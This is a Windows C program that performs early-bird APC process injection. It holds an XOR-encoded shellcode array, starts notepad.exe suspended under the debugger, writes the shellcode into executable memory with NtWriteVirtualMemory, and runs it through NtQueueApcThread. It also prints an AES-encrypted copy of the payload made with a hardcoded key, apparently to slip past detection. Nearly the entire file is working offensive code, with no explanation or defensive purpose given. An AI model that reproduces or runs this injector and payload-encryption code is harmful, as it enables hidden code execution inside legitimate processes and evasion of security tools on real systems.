#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "aes.h"
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif


int roundUp(int numToRound, int multiple) {
    if (multiple == 0) {
        return numToRound;
    }
    int remainder = numToRound % multiple;
    if (remainder == 0) {
        return numToRound;
    }
    return numToRound + multiple - remainder;
}


int main() {

    typedef NTSTATUS(NTAPI* NtQueueApcThread_t)(
        HANDLE ThreadHandle,
        PVOID ApcRoutine, // A pointer to the APC function
        PVOID ApcArgument1, // Process-defined information to pass to the APC function (normally NULL)
        PVOID ApcArgument2, // Process-defined information to pass to the APC function (normally NULL)
        PVOID ApcArgument3  // Process-defined information to pass to the APC function (normally NULL)
        );

    typedef NTSTATUS(NTAPI* NtWriteVirtualMemoryFunc)(
        HANDLE ProcessHandle,
        PVOID BaseAddress,
        PVOID Buffer,
        ULONG NumberOfBytesToWrite,
        PULONG NumberOfBytesWritten
        );

    BYTE sshcode[] = {
    0xeb,0x27,0x5b,0x53,0x5f,0xb0,0x6d,0xfc,0xae,0x75,0xfd,0x57,0x59,0x53,
    0x5e,0x8a,0x06,0x30,0x07,0x48,0xff,0xc7,0x48,0xff,0xc6,0x66,0x81,0x3f,
    0xc3,0x11,0x74,0x07,0x80,0x3e,0x6d,0x75,0xea,0xeb,0xe6,0xff,0xe1,0xe8,
    0xd4,0xff,0xff,0xff,0x10,0x6d,0xec,0x58,0x93,0xf4,0xe0,0xf8,0xd0,0x10,
    0x10,0x10,0x51,0x41,0x51,0x40,0x42,0x41,0x46,0x58,0x21,0xc2,0x75,0x58,
    0x9b,0x42,0x70,0x58,0x9b,0x42,0x08,0x58,0x9b,0x42,0x30,0x58,0x9b,0x62,
    0x40,0x58,0x1f,0xa7,0x5a,0x5a,0x5d,0x21,0xd9,0x58,0x21,0xd0,0xbc,0x2c,
    0x71,0x6c,0x12,0x3c,0x30,0x51,0xd1,0xd9,0x1d,0x51,0x11,0xd1,0xf2,0xfd,
    0x42,0x51,0x41,0x58,0x9b,0x42,0x30,0x9b,0x52,0x2c,0x58,0x11,0xc0,0x9b,
    0x90,0x98,0x10,0x10,0x10,0x58,0x95,0xd0,0x64,0x77,0x58,0x11,0xc0,0x40,
    0x9b,0x58,0x08,0x54,0x9b,0x50,0x30,0x59,0x11,0xc0,0xf3,0x46,0x58,0xef,
    0xd9,0x51,0x9b,0x24,0x98,0x58,0x11,0xc6,0x5d,0x21,0xd9,0x58,0x21,0xd0,
    0xbc,0x51,0xd1,0xd9,0x1d,0x51,0x11,0xd1,0x28,0xf0,0x65,0xe1,0x5c,0x13,
    0x5c,0x34,0x18,0x55,0x29,0xc1,0x65,0xc8,0x48,0x54,0x9b,0x50,0x34,0x59,
    0x11,0xc0,0x76,0x51,0x9b,0x1c,0x58,0x54,0x9b,0x50,0x0c,0x59,0x11,0xc0,
    0x51,0x9b,0x14,0x98,0x58,0x11,0xc0,0x51,0x48,0x51,0x48,0x4e,0x49,0x4a,
    0x51,0x48,0x51,0x49,0x51,0x4a,0x58,0x93,0xfc,0x30,0x51,0x42,0xef,0xf0,
    0x48,0x51,0x49,0x4a,0x58,0x9b,0x02,0xf9,0x47,0xef,0xef,0xef,0x4d,0x58,
    0xaa,0x11,0x10,0x10,0x10,0x10,0x10,0x10,0x10,0x58,0x9d,0x9d,0x11,0x11,
    0x10,0x10,0x51,0xaa,0x21,0x9b,0x7f,0x97,0xef,0xc5,0xab,0xe0,0xa5,0xb2,
    0x46,0x51,0xaa,0xb6,0x85,0xad,0x8d,0xef,0xc5,0x58,0x93,0xd4,0x38,0x2c,
    0x16,0x6c,0x1a,0x90,0xeb,0xf0,0x65,0x15,0xab,0x57,0x03,0x62,0x7f,0x7a,
    0x10,0x49,0x51,0x99,0xca,0xef,0xc5,0x73,0x71,0x7c,0x73,0x3e,0x75,0x68,
    0x75,0x10,0xc3,0x11
    };


    HMODULE hNtdll = GetModuleHandle(TEXT("ntdll.dll"));
    if (hNtdll == NULL) {
        printf("Failed to get handle for ntdll.dll (%d).\n", GetLastError());
        return -1;
    }

    NtQueueApcThread_t MyNtQueueApcThread = (NtQueueApcThread_t)GetProcAddress(hNtdll, "NtQueueApcThread");
    if (MyNtQueueApcThread == NULL) {
        printf("Failed to find NtQueueApcThread in ntdll.dll (%d).\n", GetLastError());
        return -1;
    }

    HMODULE hNtDll = GetModuleHandleA("ntdll.dll");
    if (hNtDll == NULL) {
        return -1;
    }


    SIZE_T sSize = sizeof(sshcode);
    SIZE_T finalsSize = 0;
    unsigned char Padd[16] = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
    unsigned char Nop[1] = { 0x90 };

#define NEWSHCODELEN sizeof(sshcode) + 32         
    unsigned char NewPaddedSsh[NEWSHCODELEN];
    if (sSize % 16 == 0) {
        printf("[i] The S is Already multiple of 16, Padding with 16 Nops Only \n");
        memcpy(NewPaddedSsh, sshcode, sSize);
        memcpy(NewPaddedSsh + sSize, Padd, sizeof(Padd));
        finalsSize = sSize + 16;
    }
    else {
        printf("[i] The shllcode is Not multiple of 16\n");
        int MultipleBy16 = roundUp(sSize, 16);
        printf("[+] Constructing the S To Be Multiple Of 16, Target Size: %d \n", MultipleBy16);
        int HowManyToAdd = MultipleBy16 - sSize;
        memcpy(NewPaddedSsh, sshcode, sSize);
        int i = 0;
        while (TRUE) {
            memcpy(NewPaddedSsh + sSize + i, Nop, 1);
            if (i == HowManyToAdd) {
                break;
            }
            i++;
        }
        printf("[+] Added : %d \n", i);
        printf("[+] Padding with Extra 16 Nops ...\n");
        memcpy(NewPaddedSsh + sSize + i, Padd, sizeof(Padd));
        finalsSize = sSize + i + 16;
    }

    printf("[+] New S Size is : %ld \n", finalsSize);
    unsigned char key[] = "CaptainKle";
    unsigned char iv[] = "\x9d\x02\x35\x3b\xa3\x4b\xec\x26\x13\x88\x58\x51\x11\x47\xa5\x98";
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);
    AES_CBC_encrypt_buffer(&ctx, NewPaddedSsh, finalsSize);
    printf("\nunsigned char Encryptedbuffer[%ld] = {", finalsSize);
    printf("\t");
    for (int i = 0; i < finalsSize; i++) {
        if (i == finalsSize - 1) {
            printf("0x%02x ", NewPaddedSsh[i]);
            break;
        }
        if (i % 16 == 0) {
            printf("\n\t");
        }
        printf("0x%02x, ", NewPaddedSsh[i]);
    }
    printf("\n}; \n");



    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    BOOL bSuccess = FALSE;
    LPCWSTR lpApplicationName = L"C:\\Windows\\System32\\notepad.exe";

    bSuccess = CreateProcess(lpApplicationName, NULL, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &si, &pi);
    if (!bSuccess) {
        printf("CreateProcess failed (%d).\n", GetLastError());
        return -1;
    }
    else {
        printf("Successfully created process. PID: %lu, TID: %lu\n", pi.dwProcessId, pi.dwThreadId);
        printf("The process is created with a debugging flag, and it's currently stopped at the initial breakpoint.\n");
        printf("Process Name: %ws\n", lpApplicationName);
        getchar();

    }
    DEBUG_EVENT de = { 0 };
    while (WaitForDebugEvent(&de, INFINITE)) {
        if (de.dwDebugEventCode == EXCEPTION_DEBUG_EVENT) {
            if (de.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_BREAKPOINT) {
                // Print the exception address (where the breakpoint happened)
                printf("Breakpoint hit at address: 0x%p\n", de.u.Exception.ExceptionRecord.ExceptionAddress);

                // Optionally, pause the execution for the user to see the address
                printf("Press Enter to continue after the breakpoint...\n");
                getchar();

                break; // Exit the loop as we've hit our initial breakpoint
            }
        }
        ContinueDebugEvent(de.dwProcessId, de.dwThreadId, DBG_CONTINUE);
    }

    LPVOID pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, sSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pRemoteCode == NULL) {
        printf("VEXfailed (%d).\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        return -1;
    }


    printf("Memory allocated in target process. \n");
    printf("  Base Address : 0x%p\n", pRemoteCode);
    printf("  Size         : %zu bytes\n", sSize);
    printf("  Permissions  : PAGE_EXECUTE_READWRITE\n");
    printf("Press Enter to continue...\n");
    getchar();

    // Get a pointer to the function in the DLL
    NtWriteVirtualMemoryFunc MyNtWriteVirtualMemory = (NtWriteVirtualMemoryFunc)GetProcAddress(hNtDll, "NtWriteVirtualMemory");
    if (MyNtWriteVirtualMemory == NULL) {
        // Handle the error
        return -1;
    }

    // The buffer and length you want to write
    PVOID buffer = sshcode;
    ULONG length = sizeof(sshcode);
    ULONG bytesWritten;

    NTSTATUS status = MyNtWriteVirtualMemory(pi.hProcess, pRemoteCode, buffer, length, &bytesWritten);
    if (!NT_SUCCESS(status)) {
        // Handle the error, perhaps using GetLastError() to get more information
        TerminateProcess(pi.hProcess, 0);
        return -1;
    }

    printf("Data written to remote process at address: %p\n", pRemoteCode);
    printf("Number of bytes written: %llu\n", (unsigned long long)bytesWritten);
    printf("Press Enter to continue...\n");
    getchar();
    status = MyNtQueueApcThread(
        pi.hThread,
        (PVOID)pRemoteCode,
        NULL,
        NULL,
        NULL
    );

    // Ideally, you should also handle the potential error after this function call.
    if (!NT_SUCCESS(status)) {
        // Handle error, perhaps clean up or log
        return -1; // Or another appropriate error response
    }

    if (!DebugActiveProcessStop(pi.dwProcessId)) {
        printf("DebugActiveProcessStop failed (%d).\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        return -1;
    }

    printf("Pay successfully injected.\n");

    // Cleanup: Close the handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}